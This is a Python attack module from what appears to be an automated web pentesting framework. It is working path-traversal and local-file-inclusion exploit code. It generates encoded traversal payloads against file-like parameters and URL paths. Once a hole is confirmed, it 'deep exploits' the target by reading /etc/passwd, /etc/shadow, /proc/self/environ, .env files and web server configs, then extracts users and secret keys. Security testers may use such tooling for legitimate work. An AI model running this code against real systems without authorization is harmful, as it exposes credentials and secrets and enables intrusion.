"""Path Traversal & LFI Attack Module — Nuclei-Grade Deep Exploitation (V15).

Verifies arbitrary file read / path traversal / local file inclusion:
- Query parameter injection: ?file=../../../../etc/passwd
- URL PATH-based injection: /file/../../../../etc/passwd (CVE-2021-43831 style)
- Encoding bypass: %2e%2e%2f, %252e, ..../, mixed slashes
- PHP wrappers: php://filter/convert.base64-encode/resource=
- Null byte injection: ../../../../etc/passwd%00

Deep Exploitation after confirmation:
- Parse /etc/passwd → extract real users (uid ≥ 1000)
- Read /etc/os-release, /proc/version, /etc/hostname
- Read application config files (.env, config.php)
- Extract sensitive environment variables
- Full system profiling (OS, kernel, web server)

ALL OPERATIONS READ-ONLY. No file write/delete/modify.
"""

from __future__ import annotations

import hashlib
import logging
import re
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from app.attacks.base import AttackPlan, BaseAttackModule, ValidationResult
from app.core.session_context import SessionContext
from app.orchestration.attack_opportunity import AttackOpportunity

logger = logging.getLogger("attacks.traversal")

# Depths to test
_DEPTHS = [5, 8, 10, 12, 15]

# Target files and their validation signatures
LINUX_PROBES: List[Tuple[str, re.Pattern, str]] = [
    ("etc/passwd", re.compile(r"root:[x*]:0:0:", re.I), "/etc/passwd"),
    ("etc/hostname", re.compile(r"^[a-zA-Z0-9._-]+$", re.M), "/etc/hostname"),
    ("etc/os-release", re.compile(r"(NAME=|PRETTY_NAME=|ID=)", re.I), "/etc/os-release"),
    ("proc/version", re.compile(r"Linux version \d+\.\d+", re.I), "/proc/version"),
]

WINDOWS_PROBES: List[Tuple[str, re.Pattern, str]] = [
    ("windows/win.ini", re.compile(r"\[(fonts|extensions|files|mci extensions)\]", re.I), "win.ini"),
    ("windows/system.ini", re.compile(r"\[(boot|drivers|386Enh)\]", re.I), "system.ini"),
]

# Deep exploitation files (read-only, non-destructive)
DEEP_FILES: List[Tuple[str, str, re.Pattern]] = [
    ("etc/passwd", "passwd_content", re.compile(r"root:[x*]:0:0:", re.I)),
    ("etc/os-release", "os_release", re.compile(r"(NAME=|PRETTY_NAME=|ID=)", re.I)),
    ("proc/version", "kernel_version", re.compile(r"Linux version", re.I)),
    ("etc/hostname", "hostname", re.compile(r"^[a-zA-Z0-9._-]+$", re.M)),
    ("proc/self/environ", "environment", re.compile(r"(PATH=|HOME=|USER=|HOSTNAME=)", re.I)),
    ("etc/shadow", "shadow_readable", re.compile(r"root:.*:\d+:\d+:", re.I)),
    ("etc/nginx/nginx.conf", "nginx_conf", re.compile(r"(server|location|listen|root)", re.I)),
    ("etc/apache2/apache2.conf", "apache_conf", re.compile(r"(ServerRoot|Listen|LoadModule)", re.I)),
    ("var/www/html/.env", "dotenv", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I)),
    ("var/www/.env", "dotenv_www", re.compile(r"(DB_|APP_|SECRET|KEY|PASSWORD)", re.I)),
    ("proc/self/status", "proc_status", re.compile(r"(Name:|Pid:|Uid:|State:)", re.I)),
    ("etc/issue", "os_issue", re.compile(r"(Ubuntu|Debian|CentOS|Alpine|Red Hat)", re.I)),
]

# URL path patterns indicating potential LFI
PATH_LFI_PATTERNS = [
    re.compile(r"/(?:file|download|image|img|asset|static|media|attachment|upload|doc|document|template|page|view|include|load|read|get|fetch|resource|content|data)/", re.I),
]


class TraversalAttackModule(BaseAttackModule):
    def __init__(self) -> None:
        super().__init__(attack_type="traversal", cwe_id="CWE-22", default_severity="HIGH")

    async def discover(self, target: str, context: Dict[str, Any]) -> List[AttackOpportunity]:
        opps: List[AttackOpportunity] = []
        urls = context.get("urls", [])
        for u in urls:
            parsed = urlparse(u)

            # Check query parameters
            if parsed.query:
                params = parse_qs(parsed.query)
                for p in params:
                    if any(k in p.lower() for k in (
                        "file", "path", "doc", "page", "template", "view", "include",
                        "dir", "load", "read", "download", "src", "source", "resource",
                        "attachment", "filename", "filepath", "img", "image", "lang",
                        "module", "plugin", "theme", "config", "log", "export", "fetch",
                    )):
                        opps.append(AttackOpportunity(
                            target=target, endpoint=u, parameter=p,
                            attack_type="traversal",
                            hypothesis=f"Path parameter '{p}' on {parsed.path} may allow file read.",
                            priority=95,
                        ))

            # Check URL path for LFI patterns (CVE-2021-43831 style)
            for pattern in PATH_LFI_PATTERNS:
                if pattern.search(parsed.path or "/"):
                    opps.append(AttackOpportunity(
                        target=target, endpoint=u, parameter="URL_PATH",
                        attack_type="traversal",
                        hypothesis=f"URL path '{parsed.path}' contains file-like segment — potential path-based LFI.",
                        priority=95,
                    ))
                    break

        return opps

    async def plan(self, opportunity: AttackOpportunity) -> AttackPlan:
        is_path_based = opportunity.parameter == "URL_PATH"
        return AttackPlan(
            title=f"{'URL Path' if is_path_based else 'Parameter'} LFI / Path Traversal on {opportunity.parameter}",
            attack_type="traversal",
            target=opportunity.endpoint,
            steps=[
                "1. Baseline response capture",
                "2. Standard relative traversal at depths 5-15 (../../../../etc/passwd)",
                "3. Encoding bypass (URL-encoded, double-encoded, ....// bypass)",
                "4. Windows target testing (win.ini, system.ini)",
                "5. Deep exploitation: read /etc/passwd, /etc/os-release, .env, nginx.conf, etc.",
                "6. Parse /etc/passwd for user enumeration",
            ],
            payloads=[
                "../" * d + "etc/passwd" for d in _DEPTHS
            ] + [
                "..../" * d + "etc/passwd" for d in _DEPTHS[:3]
            ] + [
                "%2e%2e%2f" * d + "etc/passwd" for d in _DEPTHS[:3]
            ],
            expected_evidence="System file content (root:x:0:0:), then OS/user/config data",
            context={"parameter": opportunity.parameter, "is_path_based": is_path_based},
        )

    async def validate(self, opportunity: AttackOpportunity, session: SessionContext) -> ValidationResult:
        endpoint = opportunity.endpoint
        param = opportunity.parameter
        is_path_based = param == "URL_PATH"

        if not param:
            return ValidationResult(
                is_vulnerable=False, confidence=0.0, proof_level="P0",
                attack_type="traversal", target_url=endpoint,
                message="No parameter specified for traversal testing.",
            )

        parsed = urlparse(endpoint)

        # Baseline
        baseline_resp = await session.get(endpoint)
        baseline_body = baseline_resp.text if baseline_resp else ""

        if is_path_based:
            return await self._validate_path_based(
                session, endpoint, parsed, baseline_body, baseline_resp,
            )
        else:
            return await self._validate_param_based(
                session, endpoint, param, parsed, baseline_body, baseline_resp,
            )

    async def _validate_path_based(
        self,
        session: SessionContext,
        endpoint: str,
        parsed: Any,
        baseline_body: str,
        baseline_resp: Any,
    ) -> ValidationResult:
        """Test URL PATH-based LFI — /file/../../../../etc/passwd (CVE-2021-43831 style)."""
        base_url = f"{parsed.scheme}://{parsed.netloc}"
        path = parsed.path or "/"

        # Find injection point (after file-like segment)
        injection_idx = None
        for pattern in PATH_LFI_PATTERNS:
            match = pattern.search(path)
            if match:
                injection_idx = match.end()
                break

        if injection_idx is None:
            # Fallback: inject at end of path
            injection_idx = len(path)
            if not path.endswith("/"):
                injection_idx += 1

        for target_file, pattern, desc in LINUX_PROBES + WINDOWS_PROBES:
            for depth in _DEPTHS:
                techniques = [
                    ("../", "standard"),
                    (".../", "dot_bypass"),
                    ("%2e%2e%2f", "url_encoded"),
                    ("%2e%2e/", "partial_encode"),
                ]
                for prefix_unit, technique in techniques:
                    traversal = prefix_unit * depth + target_file
                    test_path = path[:injection_idx] + traversal
                    test_url = f"{base_url}{test_path}"
                    if parsed.query:
                        test_url += f"?{parsed.query}"

                    resp = await session.get(test_url)
                    if not resp or resp.status_code not in (200, 301, 302):
                        continue

                    body = resp.text
                    if pattern.search(body) and not pattern.search(baseline_body):
                        # Confirmed! Deep exploitation
                        exploitation = await self._exploit_deep(
                            session, base_url, path[:injection_idx],
                            prefix_unit * depth, baseline_body,
                        )

                        poc_curl = f"curl -ksSL '{test_url}'"
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.99 if exploitation else 0.97,
                            proof_level="P5" if exploitation else "P4",
                            attack_type="traversal",
                            target_url=endpoint,
                            parameter="URL_PATH",
                            baseline_status=baseline_resp.status_code if baseline_resp else 0,
                            exploit_status=resp.status_code,
                            evidence={
                                "target_file": desc,
                                "payload": traversal,
                                "technique": technique,
                                "depth": depth,
                                "response_sample": body[:500],
                                "response_hash": hashlib.sha256(body.encode()).hexdigest()[:16],
                                "traversal_url": test_url,
                            },
                            exploitation_data=exploitation or {},
                            poc_curl=poc_curl,
                            message=f"CRITICAL: Path Traversal / LFI confirmed via URL path ({desc}, {technique} x{depth})."
                                    + (f" {exploitation.get('files_read_count', 0)} additional files extracted" if exploitation else ""),
                            cwe_id="CWE-22",
                            severity="CRITICAL" if exploitation else "HIGH",
                        )

        return ValidationResult(
            is_vulnerable=False, confidence=0.2, proof_level="P0",
            attack_type="traversal", target_url=endpoint, parameter="URL_PATH",
            message="URL path-based traversal payloads did not yield system file contents.",
        )

    async def _validate_param_based(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        parsed: Any,
        baseline_body: str,
        baseline_resp: Any,
    ) -> ValidationResult:
        """Test query/body parameter for path traversal."""
        query_params = parse_qs(parsed.query)

        for target_file, pattern, desc in LINUX_PROBES + WINDOWS_PROBES:
            for depth in _DEPTHS:
                techniques = [
                    ("../", "standard"),
                    (".../", "dot_bypass"),
                    ("%2e%2e%2f", "url_encoded"),
                    ("%252e%252e%252f", "double_encoded"),
                    ("..\\", "backslash"),
                ]
                for prefix_unit, technique in techniques:
                    payload = prefix_unit * depth + target_file

                    t_params = dict(query_params)
                    t_params[param] = [payload]
                    probe_url = urlunparse((
                        parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                        urlencode(t_params, doseq=True), parsed.fragment,
                    ))

                    resp = await session.get(probe_url)
                    if not resp or resp.status_code not in (200, 301, 302):
                        continue

                    body = resp.text
                    if pattern.search(body) and not pattern.search(baseline_body):
                        # Confirmed! Deep exploitation
                        traversal_prefix = prefix_unit * depth
                        exploitation = await self._exploit_deep_param(
                            session, endpoint, param, query_params, parsed,
                            traversal_prefix, baseline_body,
                        )

                        poc_curl = f"curl -ksSL '{probe_url}'"
                        return ValidationResult(
                            is_vulnerable=True,
                            confidence=0.99 if exploitation else 0.97,
                            proof_level="P5" if exploitation else "P4",
                            attack_type="traversal",
                            target_url=endpoint,
                            parameter=param,
                            baseline_status=baseline_resp.status_code if baseline_resp else 0,
                            exploit_status=resp.status_code,
                            evidence={
                                "target_file": desc,
                                "payload": payload,
                                "technique": technique,
                                "depth": depth,
                                "matched_signature": str(pattern.pattern),
                                "response_sample": body[:500],
                            },
                            exploitation_data=exploitation or {},
                            poc_curl=poc_curl,
                            message=f"CRITICAL: Path Traversal / LFI confirmed on parameter '{param}' ({desc}, {technique} x{depth})."
                                    + (f" {exploitation.get('files_read_count', 0)} additional files extracted" if exploitation else ""),
                            cwe_id="CWE-22",
                            severity="CRITICAL" if exploitation else "HIGH",
                        )

        return ValidationResult(
            is_vulnerable=False, confidence=0.2, proof_level="P0",
            attack_type="traversal", target_url=endpoint, parameter=param,
            message=f"Parameter '{param}' did not yield system file contents upon traversal attempts.",
        )

    async def _exploit_deep(
        self,
        session: SessionContext,
        base_url: str,
        path_prefix: str,
        traversal_prefix: str,
        baseline_body: str,
    ) -> Optional[Dict[str, Any]]:
        """Deep exploitation for path-based LFI — read 12+ system files."""
        exploitation: Dict[str, Any] = {"files_read": {}, "os_type": "unknown"}

        for target_file, key, pattern in DEEP_FILES:
            payload = traversal_prefix + target_file
            test_url = f"{base_url}{path_prefix}{payload}"

            resp = await session.get(test_url)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text
            if pattern.search(body) and len(body.strip()) > 10:
                exploitation["files_read"][key] = {
                    "file": f"/{target_file}",
                    "content": body.strip()[:2000],
                    "size": len(body),
                    "url": test_url,
                }
                self._parse_content(exploitation, key, body)

        return self._finalize_exploitation(exploitation)

    async def _exploit_deep_param(
        self,
        session: SessionContext,
        endpoint: str,
        param: str,
        query_params: dict,
        parsed: Any,
        traversal_prefix: str,
        baseline_body: str,
    ) -> Optional[Dict[str, Any]]:
        """Deep exploitation for param-based LFI."""
        exploitation: Dict[str, Any] = {"files_read": {}, "os_type": "unknown"}

        for target_file, key, pattern in DEEP_FILES:
            payload = traversal_prefix + target_file

            t_params = dict(query_params)
            t_params[param] = [payload]
            probe_url = urlunparse((
                parsed.scheme, parsed.netloc, parsed.path, parsed.params,
                urlencode(t_params, doseq=True), parsed.fragment,
            ))

            resp = await session.get(probe_url)
            if not resp or resp.status_code not in (200, 301, 302):
                continue

            body = resp.text
            if pattern.search(body) and len(body.strip()) > 10:
                exploitation["files_read"][key] = {
                    "file": f"/{target_file}",
                    "content": body.strip()[:2000],
                    "size": len(body),
                    "payload": payload,
                }
                self._parse_content(exploitation, key, body)

        return self._finalize_exploitation(exploitation)

    @staticmethod
    def _parse_content(exploitation: dict, key: str, content: str) -> None:
        """Parse file contents for structured evidence."""
        if key == "passwd_content":
            lines = [l for l in content.strip().splitlines() if ":" in l and not l.startswith("#")]
            exploitation["passwd_entries"] = len(lines)
            exploitation["passwd_content"] = "\n".join(lines)
            real_users = []
            for line in lines:
                parts = line.split(":")
                if len(parts) >= 7:
                    try:
                        uid = int(parts[2])
                        if uid >= 1000 or parts[0] == "root":
                            real_users.append({
                                "username": parts[0], "uid": uid,
                                "gid": int(parts[3]), "home": parts[5], "shell": parts[6],
                            })
                    except (ValueError, IndexError):
                        pass
            exploitation["real_users"] = real_users
            exploitation["os_type"] = "linux"

        elif key == "os_release":
            for line in content.splitlines():
                if line.startswith("PRETTY_NAME="):
                    exploitation["os_pretty_name"] = line.split("=", 1)[1].strip().strip('"')
                elif line.startswith("ID="):
                    exploitation["os_id"] = line.split("=", 1)[1].strip().strip('"')
                elif line.startswith("VERSION_ID="):
                    exploitation["os_version"] = line.split("=", 1)[1].strip().strip('"')

        elif key == "kernel_version":
            match = re.search(r"Linux version (\S+)", content)
            if match:
                exploitation["kernel"] = match.group(1)

        elif key == "hostname":
            exploitation["hostname"] = content.strip().splitlines()[0].strip()

        elif key == "shadow_readable":
            exploitation["shadow_accessible"] = True

        elif key in ("dotenv", "dotenv_www"):
            env_keys = []
            for line in content.splitlines():
                if "=" in line and not line.startswith("#"):
                    k = line.split("=", 1)[0].strip()
                    if k:
                        env_keys.append(k)
            exploitation["env_keys_exposed"] = env_keys[:30]
            exploitation["env_file_found"] = True

    @staticmethod
    def _finalize_exploitation(exploitation: dict) -> Optional[Dict[str, Any]]:
        """Finalize exploitation data — only return if we got actual files."""
        if exploitation.get("files_read"):
            exploitation["files_read_count"] = len(exploitation["files_read"])
            exploitation["exploitation_type"] = "local_file_inclusion"
            return exploitation
        return None
